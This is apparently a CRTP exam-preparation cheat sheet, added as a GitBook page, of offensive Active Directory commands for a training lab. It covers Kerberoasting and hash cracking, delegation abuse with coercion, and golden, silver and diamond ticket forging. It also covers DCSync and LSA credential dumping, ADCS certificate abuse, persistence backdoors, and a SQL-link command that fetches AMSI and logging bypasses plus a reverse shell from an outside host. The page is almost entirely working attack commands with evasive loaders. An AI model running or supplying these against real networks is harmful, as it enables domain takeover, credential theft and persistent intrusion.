@@ -1,0 +1,744 @@
+# CRTP Prepration
+
+{% embed url="https://www.brunorochamoura.com/tags/cpts-%EF%B8%8F/" %}
+
+{% embed url="https://youtu.be/83Qst4Zrhe4" %}
+
+{% embed url="https://youtu.be/h53sRfcsVIo" %}
+
+### Domain Enumeration
+
+{% tabs %}
+{% tab title="Basic" %}
+{% code overflow="wrap" %}
+```powershell
+# Users
+Get-DomainUser | select samaccountname
+
+# Computers
+Get-DomainComputer | select cn
+
+# DAs
+Get-DomainGroupMember -identity "Domain Admins" | select membername
+
+# EAs
+Get-DomainGroupMember -identity "Enterprise Admins" -domain <domain> | select membername
+
+# SIDs
+Get-DomainSID
+
+# Collect BH data
+SharpHound.exe -c all --zipfilename crtp_data --outputdirectory .\
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Shares" %}
+{% code overflow="wrap" %}
+```powershell
+# Create a host list
+Get-DomainComputer | ForEach-Object { $_.cn.Trim() } > servers.txt
+# Enumerate shares
+Invoke-HuntSMBShares -NonPing -OutputDirectory .\ -HostList servers.txt
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Trusts" %}
+{% code overflow="wrap" %}
+```powershell
+# Forest domains
+Get-ForestDomain | select name
+
+# Domain trusts
+Get-DomainTrust
+
+# External trusts
+Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+# External trusts (forest root)
+Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "Filter_Sids"}
+
+# Trusts for all domains in the specified forest
+Get-ForestDomain -forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
+Get-DomainTrust -domain eurocorp.local
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+### Privilege Escalation
+
+{% tabs %}
+{% tab title="LA & Sessions" %}
+{% code overflow="wrap" %}
+```powershell
+# Enumerate LA access on domain hosts
+Find-PSRemotingLocalAdminAccess
+
+# Create a host list
+Get-DomainComputer | ForEach-Object { $_.cn.Trim() } > servers.txt
+# List active sessions (no elevated privileges are required on the remote hosts)
+Invoke-SessionHunter -NoPortScan -RawResults -Targets .\servers.txt | select Hostname,UserSession,Access
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Kerberoasting" %}
+Find user accounts used as service accounts with [PowerView](https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/powerview):
+
+{% code overflow="wrap" %}
+```powershell
+# Enumerate SPNs with PowerView
+Get-DomainUser * -SPN | select samaccountname,serviceprincipalname
+
+# Kerberoast the enumerated accounts with PowerView
+Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
+
+# Kerberoast the target account with PowerView
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+# Clear the SPNs of the target account
+Set-DomainObject -Identity sqldev -Clear serviceprincipalname
+```
+{% endcode %}
+
+The `krb5tgs` hashes can be cracked offline using [Hashcat](https://x7331.gitbook.io/boxes/tools/passwords/hashcat) or [JtR](https://x7331.gitbook.io/boxes/tools/passwords/john):
+
+{% code overflow="wrap" %}
+```bash
+# Crack the hashes using Hashcat
+sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# Crack the hashes using John the Ripper
+.\john.exe --wordlist=<wordlist> hashes.kerberoast
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="UD" %}
+Unconstrained → impersonate any user to any service (LA → DA):
+
+{% hint style="warning" %}
+* RPRN → FQDN
+* WSP/DFS → netBIOS
+{% endhint %}
+
+{% code overflow="wrap" %}
+```powershell
+# Enumerate servers with UD enabled (PowerView)
+Get-DomainComputer -Unconstrained | select name
+
+# Start a process as the LA of the target host
+Loader.exe -path Rubeus.exe -args asktgt /user:<LA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Copy binary to the target host
+echo F | xcopy Loader.exe \\dcorp-appsrv\c$\users\public\loader.exe
+
+# Connect to the target host
+winrs -r:dcorp-appsrv cmd
+
+# Create a port forward
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=172.16.100.37 connectport=80
+
+# Start Rubeus in listener mode
+c:\users\public\loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:dcorp-dc$ /interval:5 /nowrap
+
+# Force coercion via the Printer Bug (as student337 on dcorp-std337)
+MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+# Force coercion via MS-WSP (as student337 on dcorp-std337)
+Loader.exe -path WSPCoerce.exe -args dcorp-dc dcorp-appsrv
+# Force coercion via MS-DFSNM (as student337 on dcorp-std337)
+DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
+
+# The Base64-encoded ticket of dcorp-dc$ will appear on the listener
+
+# Inject the ticket in the current session
+Loader.exe -path Rubeus.exe -args ptt /ticket:doI...BTA==
+
+# Perform DCSyc to test the ticket
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
+{% endcode %}
+
+LA → EA (same as above, but different target on listener and different coercion source)
+
+{% code overflow="wrap" %}
+```powershell
+# Start Rubeus in listener mode (as appadmin on dcorp-appsrv)
+c:\users\public\loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:mcorp-dc$ /interval:5 /nowrap
+
+# Force coercion via the Printer Bug (as student337 on dcorp-std337)
+MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+
+# Force coercion via MS-WSP (as student337 on dcorp-std337)
+Loader.exe -path WSPCoerce.exe -args mcorp-dc.moneycorp.local dcorp-appsrv.dollarcorp.moneycorp.local
+
+# Force coercion via MS-DFSNM (as student337 on dcorp-std337)
+DFSCoerce-andrea.exe -t mcorp-dc -l dcorp-appsrv.dollarcorp.moneycorp.local
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="CD" %}
+Constrained → impersonate specific users to specific hosts (LA → DA):
+
+{% code overflow="wrap" %}
+```powershell
+# Enumerate users with CD enabled (PowerView)
+Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto,useraccountcontrol | Format-list
+
+# Make the ST request impersonating the DA
+Loader.exe -path Rubeus.exe -args s4u /user:websvc /aes256:<key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt
+
+# Access the target's file system as DA
+dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+```
+{% endcode %}
+
+Access non-allowed services:
+
+{% hint style="warning" %}
+Services are case-sensitive → `LDAP` not `ldap`!
+{% endhint %}
+
+{% code overflow="wrap" %}
+```powershell
+# Enumerate computers with CD enabled (PowerView)
+Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto,useraccountcontrol | Format-list
+
+# From an elevated shell alter the service
+Loader.exe -path Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:<key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local /altservice:LDAP /ptt
+
+# Test impersonation via a DCSync attack
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="RBCD" %}
+Resource-Based → same as CD, but based on the resource itself (LA → DA):
+
+{% code overflow="wrap" %}
+```powershell
+# Start a process as the LA of the target host
+Loader.exe -path Rubeus.exe -args asktgt /user:<LA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Configure RBCD for the target account (PowerView)
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std337$'
+
+# Confirm that the above worked (PowerView)
+> Get-DomainRBCD
+
+SourceName                 : DCORP-MGMT$
+ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
+                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
+DelegatedName              : DCORP-STD337$
+
+# Extract the account's credentials (from an elevated shell on std337)
+> Loader.exe -path SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+
+Username : dcorp-std337$
+aes256_hmac   b8369e2c5c07015f0f9138ee81625edf969135cb174f4ad452f7ae0634534bea
+rc4_hmac_nt   15f64792d8eb59d41a6668596e037793
+
+# Abuse RBCD to access dcorp-mgmt as DA (as student337 on dcorp-std337)
+Loader.exe -path Rubeus.exe -args s4u /user:dcorp-std337$ /aes256:<key> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+
+# Test access on the target host
+winrs -r:dcorp-mgmt "set username & set computername"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="MSSQL" %}
+Use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL):
+
+{% code overflow="wrap" %}
+```powershell
+# Gather server information (PowerUpSQL)
+Get-SQLInstanceDomain | Get-SQLServerinfo | select computername,instance
+
+# Check access (PowerUpSQL)
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | select computername,status
+
+# Enumerate linked chains
+Get-SQLServerLinkCrawl -Instance dcorp-mssql | select instance,path
+
+# Run query on all chain links
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'"
+
+# Run query on a target link
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget EU-SQL23
+
+# Get a reverse shell (add "Power -Reverse -IPAddress 172.16.100.X -Port 443" to the end of the file)
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.37/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.37/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.37/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql23
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Local PE" %}
+{% code overflow="wrap" %}
+```powershell
+# Enumerate privilege escalation vectors (PowerUp)
+Invoke-AllChecks
+
+# Abuse the target function and add the target user to the LA group
+Invoke-ServiceAbuse -Name "AbyssWebServer" -Username "dcorp\student337"
+
+# Examples
+Get-Help Invoke-ServiceAbuse -examples
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+{% tabs %}
+{% tab title="krbtgt NT (XDomain)" %}
+Forge a GT (pre-load SIDs on the initial TGT) (DA → EA):
+
+{% code overflow="wrap" %}
+```powershell
+# GT as Administrator (generates 4672 alerts)
+
+# Execute the GT attack including the target SIDs using SafetyKatz
+Loader.exe -path SafetyKatz.exe -args "kerberos::golden /user:administrator /domain:dollarcorp.moneycorp.local /sid:<currentDomainSID> /sids:<rootDomainSID>-519 /krbtgt:<krbtgt-rc4> /ptt" "exit"
+
+# Execute the GT attack including the target SIDs using Rubeus
+Loader.exe -path Rubeus.exe -args evasive-golden /user:administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:<currentDomainSID> /sids:<rootDomainSID>-519 /aes256:<krbtgt-key> /netbios:dcorp /ptt
+
+# Access the parent domain's DC
+winrs -r:mcorp-dc cmd
+
+# Peform a DCSync to extract the forest root's krbtgt credentials
+Loader.exe -path SafetyKatz.exe -args "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+```
+{% endcode %}
+
+The machine account can be combined with SIDs for DCs (`516`) and Enterprise DCs (`S-1-5-9`) to simulate legit replication behavior between domains (no 4672 alerts as above):
+
+{% code overflow="wrap" %}
+```powershell
+# GT attack using the machine account using SafetyKatz
+Loader.exe -path SafetyKatz.exe -args "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:<currentDomainSID> /sids:<rootDomainSID>-516,s-1-5-9 /krbtgt:<krbtgt-rc4> /ptt" "exit"
+
+# GT attack using the machine account using Rubeus
+Loader.exe -path Rubeus.exe -args golden /aes256:<krbtgt-aes256key> /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:<currentDomainSID> /sids:<rootDomainSID>-516,s-1-5-9 /dc:dcorp-dc.dollarcorp.moneycorp.local /ptt
+
+# Peform a DCSync to extract the forest root's krbtgt credentials
+Loader.exe -path SafetyKatz.exe -args "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+```
+{% endcode %}
+
+For even better OPSEC, Diamond Tickets instead of GT. These resemble legitimate Kerberos requests and include a corresponding TGT request, making them less suspicious:
+
+{% code overflow="wrap" %}
+```powershell
+# Diamond Ticket (most OPSEC-friendly)
+Loader.exe -path Rubeus.exe -args diamond /krbkey:<krbtgt-aes256key> /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /tickeruserid:1000 /sids:<rootDomainSID>-516,s-1-5-9 /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Trust Key (XDomain)" %}
+Forge an inter-realm TGT (DA → EA on a specific service):
+
+{% code overflow="wrap" %}
+```powershell
+# Start a process as the LA of the target host
+Loader.exe -path Rubeus.exe -args asktgt /user:<LA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Copy loader to the target
+echo F | xcopy Loader.exe \\dcorp-dc\c$\users\public\loader.exe
+
+# Connect to the target host
+winrs -r:dcorp-dc cmd
+
+# Create a port forward
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=172.16.100.37 connectport=80
+
+# Dump the trust key
+> c:\users\public\loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+* rc4_hmac_nt       7f03e840ef582d4bfb9d5866efb570c5
+
+# Forge a ticket with SID History of EAs (as student337 on dcorp-std337)
+Loader.exe -path Rubeus.exe -args evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<trust-key> /sid:<currentDomainSID> /sids:<rootDomainSID>-519 /ldap /user:administrator /nowrap
+
+# Impersonate EA using the generated ticket
+Loader.exe -path Rubeus.exe -args asktgs /service:http/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:doI...hbA==
+ 
+# Test access on mcorp-dc
+winrs -r:mcorp-dc.moneycorp.local "set username & set computername"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Trust Key (XForest)" %}
+Forge an inter-realm TGT:
+
+{% code overflow="wrap" %}
+```powershell
+# Launch a new process as the DA
+Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Extract the forest trust key (rc4)
+Loader.exe -path SafetyKatz.exe -args "lsadump::trust /patch"
+Loader.exe -path SafetyKatz.exe -args "lsadump::lsa /patch"
+Loader.exe -path SafetyKatz.exe -args "lsadump::dcsync /user:dcorp\ecorp$" "exit"
+
+# Forge the inter-realm TGT
+Loader.exe -path Rubeus.exe -args silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<trust-key> /sid:<current-domain-SID> /ldap /user:Administrator /nowrap
+
+# Request a TGS using the forged TGT
+Loader.exe -path Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket:doI...2Fs
+
+# Access the target resource
+dir \\eurocorp-dc.eurocorp.local\<explicitly-shared-share>\
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="ADCS" %}
+```powershell
+# Check ADCS usage
+Certify.exe cas
+
+# Enumerate vulnerable templates
+Certify.exe find /vulnerable
+
+# Enumerate vulnerable templates based on the current user
+Certify.exe find /vulnerable /currentuser
+```
+
+Templates with `ENROLLEE_SUPPLIES_SUBJECT` set (ESC1):
+
+{% code overflow="wrap" %}
+```powershell
+# Enumerate ESC1-vulnerable templates
+Certify.exe find /enrolleeSuppliesSubject
+
+# CSR for DA
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+
+# CSR for EA
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
+
+# Convert PEM to PFX (to be used with Rubeus)
+openssl\openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1-EA.pfx
+
+# Request a TGT for the DA
+Rubeus.exe asktgt /user:administrator /certificate:c:\ad\tools\esc1-EA.pfx /password:kali /ptt
+
+# Request a TGT for the EA
+Rubeus.exe asktgt /user:mcorp.local\administrator /dc:mcorp-dc.moneycorp.local /certificate:c:\ad\tools\esc1-EA.pfx /password:kali /ptt
+
+# We can now access any recourse on the domain as DA/EA
+```
+{% endcode %}
+
+Templates with EKU for Client Authentication and Certificate Request Agent policy (ESC3):
+
+{% code overflow="wrap" %}
+```powershell
+# Enumerate ESC3-vulnerable templates
+Certify.exe find /client authentication
+
+# CSR
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users
+
+# Convert PEM to PFX
+openssl\openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out .\esc3-agent.pfx
+
+# Request a certificate for
+# DA
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3-agent.pfx /enrollcertpw:pass123!
+# EA
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:c:\ad\tools\esc3-EA.pfx /enrollcertpw:kali
+
+# Convert PEM to PFX
+# DA
+openssl\openssl.exe pkcs12 -in esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc3-DA.pfx
+# EA
+openssl\openssl.exe pkcs12 -in esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc3-EA.pfx
+
+# Request a TGT as 
+# DA
+Loader.exe -path Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:pass123! /ptt
+# EA
+Loader.exe -path Rubeus.exe -args asktgt
+/user:moneycorp.local\administrator /certificate:esc3-EA.pfx
+/dc:mcorp-dc.moneycorp.local /password:kali /ptt
+
+# Test access on the
+# Child DC
+winrs -r:dcorp-dc cmd /c set username
+# Root DC
+winrs -r:mcorp-dc cmd /c set username
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+### Persistence
+
+{% tabs %}
+{% tab title="GT" %}
+Forged TGT using `krbtgt`'s creds → full domain impersonation.
+
+{% code overflow="wrap" %}
+```powershell
+# Generate a Golden ticket attack command (as std337 on dcorp-std337)
+Loader.exe -path Rubeus.exe -args evasive-golden /aes256:<krbtgt-key> /sid:<currentDomainSID> /ldap /user:Administrator /printcmd
+
+# Modify the generated command as required
+Loader.exe -path Rubeus.exe -args evasive-golden /aes256:<krbtgt-key> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:<currentDomainSID> /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:875 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+
+# Test access on the DC
+winrs -r:dcorp-dc "set username & set computername"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="ST" %}
+Forged TGS → service-level access on a specific host.
+
+<table><thead><tr><th width="140.00006103515625">Service (SPN)</th><th>Provides Access To</th></tr></thead><tbody><tr><td><code>HTTP</code></td><td>WinRM (Windows Remote Management)</td></tr><tr><td><code>CIFS</code></td><td>File system (SMB shares)</td></tr><tr><td><code>HOST</code></td><td>Scheduled tasks, remote service control, WMI (partial, + <code>RPCSS</code>)</td></tr><tr><td><code>RPCSS</code></td><td>WMI (+ <code>HOST</code>), DCOM/RPC endpoint mapper</td></tr><tr><td><code>LDAP</code></td><td>DCSync (requires elevated permissions)</td></tr></tbody></table>
+
+{% hint style="warning" %}
+**SPN formatting**: it must conform to Kerberos naming conventions (e.g., `HTTP/web04.corp.com`) and is case-sensitive in some deployments.
+{% endhint %}
+
+{% code overflow="wrap" %}
+```powershell
+# Launch a new process as the DA
+Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Dump dcorp-dc$ credentials via DCSync (for WinRM access on the DC)
+Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"
+
+# Forge a TGS for WinRM (Rubeus)
+Loader.exe -path Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<dcorp-dc$-rc4> /sid:<domainSID> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+
+# Forge a TGS for WinRM (mimikatz)
+Loader.exe -path mimikatz.exe -args "kerberos::golden /sid:<domainSID> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<web04$-rc4> /user:jeffadmin" "exit"
+
+# Test access on the DC
+winrs -r:dcorp-dc "set username & set computername"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="DT" %}
+TGT tampering → Same as GT, but stealthier.
+
+{% code overflow="wrap" %}
+```powershell
+# Forge TGT using explicit creds
+Loader.exe -path Rubeus.exe -args "diamond /krbkey:<krbtgt-key> /user:student337 /password:<password> /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /domain:<domain> /dc:<dc-FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt"
+
+# Forge TGT using a cached ticket
+Loader.exe -path Rubeus.exe -args "diamond /krbkey:<krbtgt-key> /tgtdeleg /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /domain:<domain> /dc:<dc-FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="DSRM" %}
+Built-in local Admin account → can't interactively access the DC by default.
+
+{% code overflow="wrap" %}
+```powershell
+# Launch a new process as the DA
+Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Extract the DSRM password hash
+Loader.exe -path SafetyKatz.exe -args "token::elevate" "lsadump::sam" "exit"
+
+# Flip the registry key
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
+
+# PtH with DSRM credentials (/domain:<hostname-of-the-DC>)
+Loader.exe -path SafetyKatz.exe -args "sekurlsa::pth /domain:dcorp-dc /user:administrator /ntlm:<ntlm> /run:powershell.exe" "exit"
+
+# Add the DC as a trusted host (required to access it with RC4 via WinRM)
+Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
+
+# Access the DC via WinRM using the NT hash
+Enter-PSSession -cn 172.16.2.1 -Authentication NegotiateWithImplicitCredential
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="DCSync Rights" %}
+Add DCSync rights to a low-priv account:
+
+{% code overflow="wrap" %}
+```powershell
+# Launch a new process as the DA
+Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Launch InviShell (as DA on the new session)
+InviShell\RunWithPathAsAdmin.bat
+
+# Assign DCSync rights to the target user (PowerView) (as DA on the new session)
+Add-domainobjectacl -targetidentity 'dc=dollarcorp,dc=moneycorp,dc=local' -principalidentity student337 -rights DCSync -principaldomain dollarcorp.moneycorp.local -targetdomain dollarcorp.moneycorp.local
+
+# Perform DCSync (as low-priv user)
+Loader.exe -path SafetyKatz.exe -args "lsadump:evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Security Descriptors" %}
+Establish privileged-independent access to remote management interfaces.
+
+{% code overflow="wrap" %}
+```powershell
+# WMI (RACE)
+
+# On local machine
+Set-RemoteWMI -SamAccountName student337 -Verbose
+
+# On remote machine without explicit credentials
+Set-RemoteWMI -SamAccountName dcorp\student337 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+
+# On remote machine with explicit credentials
+Set-RemoteWMI -SamAccountName dcorp\student337 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
+
+# Access the target via WMI
+Get-WmiObject -Class Win32_OperatingSystem -ComputerName dcorp-dc
+
+# Remove permissions on remote machine
+Set-RemoteWMI -SamAccountName dcorp\student337 -ComputerName dcorp-dc -namespace 'root\cimv2' -Remove -Verbose
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```powershell
+# PSRemoting (unstable post-2020)
+
+# On local machine
+Set-RemotePSRemoting -SamAccountName student337 -Verbose
+
+# On remote machine without credentials (the error is expected)
+Set-RemotePSRemoting -SamAccountName dcorp\student337 -ComputerName dcorp-dc -Verbose
+
+# Access the target host
+Enter-PSSession dcorp-dc
+
+# Remopve the permissions from the remote machine
+Set-RemotePSRemoting -SamAccountName dcorp\student337 -cn dcorp-dc -Remove
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```powershell
+# Remote registry (disabled by default)
+
+# Assign remote registry access to the target user
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student337 -Verbose
+
+# Retrieve machine account hash (and continue with a ST attack!)
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+
+# Retrieve local account hash
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+
+# Retrieve domain cached credentials
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+### Misc
+
+{% tabs %}
+{% tab title="Transfers" %}
+{% code overflow="wrap" %}
+```powershell
+# Copy a file to a share
+echo F | xcopy Loader.exe \\dcorp-?\c$\users\public\Loader.exe
+# Download a file
+iwr 'http://172.16.100.37/Loader.exe' -OutFile c:\users\public\loader.exe
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Port Forward" %}
+Directly:
+
+{% code overflow="wrap" %}
+```powershell
+# Connect to the target host
+winrs -r:<target> cmd
+
+# Create a port forward
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0. connectport=80 connectaddress=172.16.100.37
+
+# Run binary
+c:\users\public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
+```
+{% endcode %}
+
+Via WinRS:
+
+{% code overflow="wrap" %}
+```powershell
+# Create a port forward via winrs
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0. connectport=80 connectaddress=172.16.100.37"
+
+# Run binary via winrs
+$null | winrs -r:dcorp-mgmt "cmd /c c:\users\public\loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="DCSync" %}
+{% code overflow="wrap" %}
+```powershell
+# Launch a new process as the DA
+Loader.exe -path Rubeus.exe -args asktgt /user:<DA> /aes256:<key> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# Copy the binary to the DC
+echo F | xcopy Loader.exe \\dcorp-dc\c$\users\public\loader.exe
+
+# Connect to the target host
+winrs -r:dcorp-dc cmd
+
+# Create a port forward
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0. listenport=8080 connectaddress=172.16.100.37 connectport=80
+
+# Dump the aes256 key of the krbtgt account via DCSync (preferred)
+> Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+# Dump the NT hash of krbtgt
+c:\users\public\loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Exfil" %}
+{% code overflow="wrap" %}
+```powershell
+# Keys
+Loader.exe -path SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+
+# LSA
+"lsadump::evasive-lsa /patch" "exit"
+
+# SAM
+"token::elevate" "lsadump::evasive-sam" "exit"
+
+# Vault
+"token::elevate" "vault::cred /patch" "exit"
+
+# DCSync
+"lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
